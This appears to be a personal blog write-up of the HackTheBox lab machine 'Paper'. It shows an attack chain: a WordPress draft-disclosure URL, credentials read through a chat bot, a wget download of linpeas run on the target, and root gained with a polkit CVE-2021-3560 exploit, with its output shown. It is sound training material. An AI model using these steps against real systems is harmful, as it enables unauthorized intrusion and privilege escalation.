---
layout: post
title: "HTB: Paper"
author: Andrew Cherney
date: 2023-02-10 19:59:00
tags: htb easy-box
icon: "/assets/icons/paper.png"
post_description: "The box Paper had an integration of the Dunder Mifflin paper company from the show 'The Office'. Each of the core characters makes an appearance on the blog hosted for the company. Michael Scott or otherwise known as Prisonmike leaves a secret draft with the registration for an internal chat service Rocket Chat. After a brief exploiting of the dwight created bot recyclops for user, root can be gained from a polkit vulnerability."
---

<h1>Summary</h1>

The box Paper had an integration of the Dunder Mifflin paper company from the show "The Office". Michael Scott or otherwise known as Prisonmike leaves a secret draft with the registration for an internal chat service Rocket Chat. After a brief exploiting of the dwight created bot **recyclops** for user, root can be gained from a polkit vulnerability. 

<h1>Enumeration</h1>

<h2>nmap</h2>

```bash
nmap 10.10.11.143 -sC 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-11 10:07 CST
Nmap scan report for paper.htb (10.10.11.143)
Host is up (0.055s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  https
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
```

We see two web server ports both with identical http responses and methods. Best to check out the http one first as it could give us more information. 

<h2>Port 80 - http</h2>

<h3>Enum</h3>

![HTTP test page](/img/paper/test_page.png)

This test page is indicative of either a subdomain or a secret directory. I'll start a dirbuster and while that runs I will inspect the information being sent and received. 

That dirb turned up no results except the **/manual** page which is standard. I did however come across a header in the **paper.htb** response packet that reads **office.paper**. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Paper]
└──╼ $curl -I paper.htb
HTTP/1.1 403 Forbidden
Date: Sun, 12 Feb 2023 00:52:27 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

I'll toss <code>10.10.11.143 paper.htb office.paper</code> into **/etc/hosts** and head over to this new domain. 

<h2>office.paper</h2>

![office.paper blog front](/img/paper/blog_front.png)

We've got a blog built off of wordpress themed around The Office and its characters. There are a two comments strewn about, one is of Creed self-advertising and the other one being: 

__"Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick"__

<h2>Wordpress</h2>

A common place to initially look is at version numbers for services being run. This wordpress site is run on 5.2.3 which can be found by searching wordpress in the rendered html. 

![Wordpress version](/img/paper/wordpress_version.png) 

<h3>Reading private posts</h3>

With **http://office.paper/?s=-1** we can view the secret posts. Alternatively with [this poc](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/) we can use **http://office.paper/?static=1** to see the contents of every post simultaneously. 

![Secret post reveal](/img/paper/secret_posts.png)

![static = 1](/img/paper/static_1.png)

You can see the difference between these two methods. The top can show secret posts but the bottom spits out the contents of every post. We can see there is a secret registration for the employee chat system **chat.office.paper** and some other very in characters posts for Prisonmike. 

<h2>chat.office.paper</h2>

After adding **chat.office.paper** to my hosts file I am greeted with **http://chat.office.paper/register/8qozr226AhkCHZdyY**.  

![Rocket chat registration](/img/paper/registration_link.png)

![Rocket general](/img/paper/rocket_general.png)

First glance is this chat platform functions similar to Teams, Slack, Discord etc.. When we look at general and scroll up we find some user called **recyclops** which apparently is a bot that can perform basic functions. Additionally you can dm this bot. 

![recyclops help](/img/paper/recyclops_help.png)

The simple functions this bot can perform are answering questions, saying jokes, getting files, reading directories, and reading the time. Some experimenting later and I can see this bot is working in dwight's home directory which implies is has at least dwight's permissions. 

<h1>User as dwight</h1>

<h2>Enum with recyclops</h2>

It should be obvious now that the two important functions recyclops can perform are ls and cat. If I throw a command such as <code>recyclops list ..</code> it can read the parent directory. Using this I poke around and find a **hubot** directory in dwight's home which is probably the underlying code running this bot. Inside **hubot** is a **.env** file that contains some credentials inside. 

![hubot .env read](/img/paper/env_read_recyclops.png)

I'll try to use "Queenofblad3s!23" for the dwight user account since the **.ssh** folder is empty. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Paper]
└──╼ $ssh dwight@paper.htb -p "Queenofblad3s!23"
The authenticity of host 'paper.htb (10.10.11.143)' can't be established.
ECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'paper.htb' (ECDSA) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 
```

```bash
[dwight@paper ~]$ cat user.txt
b734457d5dd2d55-------------
```

<h1>Root</h1>

<h2>linpeas</h2>

```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.143 - - [12/Feb/2023 15:32:07] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
[dwight@paper ~]$ wget http://10.10.14.3:8000/linpeas.sh
--2023-02-12 16:17:19--  http://10.10.14.3:8000/linpeas.sh
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828145 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh              100%[===============================>] 808.74K   986KB/s    in 0.8s    

2023-02-12 16:17:20 (986 KB/s) - ‘linpeas.sh’ saved [828145/828145]

[dwight@paper ~]$ bash linpeas.sh | tee output
```

I throw the output into a file so I can use grep to search for common vulnerabilities. Using **tee** I can see the linpeas output and it goes to the file. 

__Editors Note: When doing the box initially linpeas reveals a CVE the box is vulnerable to, but this time around it didn't flag it as being vulnerable. Trying something like this wouldn't be too out of the ordinary in the initial foothold steps, right next to "sudo -l" or "find / -perms /400 2>/dev/null"__

There is a [poc exploit in python for CVE-2021-3560](https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py) to abuse the polkit version and create a root user.  

```bash
[dwight@paper ~]$ python3 exploit.py 
**************
Exploit: Privilege escalation with polkit - CVE-2021-3560
Exploit code written by Ahmad Almorabea @almorabea
Original exploit author: Kevin Backhouse 
For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
**************
[+] Starting the Exploit 
id: ‘ahmed’: no such user
...
...
[+] User Created with the name of ahmed
[+] Timed out at: 0.008538286866102375
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
...
...
[+] Timed out at: 0.006998310658532923
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root 

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (28791): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight]#
```

```bash
[root@paper ~]# cat root.txt
62b1414f507d60c-------------
```


<h1>Post Box</h1>

<h2>recyclops scripts</h2>

If we look into the hubot scripts we can see all the commands recyclops will accept. 

```bash
[dwight@paper ~]$ ls hubot/scripts/
cmd.coffee  error.coffee  files.js  listof.js  smalltalk.js  why.js
dwight.js   example.js    help.js   run.js     version.js
```

So an alternate way to get entry with the bot would be to crawl through the hubot directory and find that recyclops accepts commands and enter your own public key into the ssh directory. 

![recyclops alt entry](/img/paper/recyclops_alt_entry.png)

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Paper]
└──╼ $ssh dwight@paper.htb -i paper.priv 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Feb 12 16:31:56 2023 from 10.10.14.3
[dwight@paper ~]$ 
```

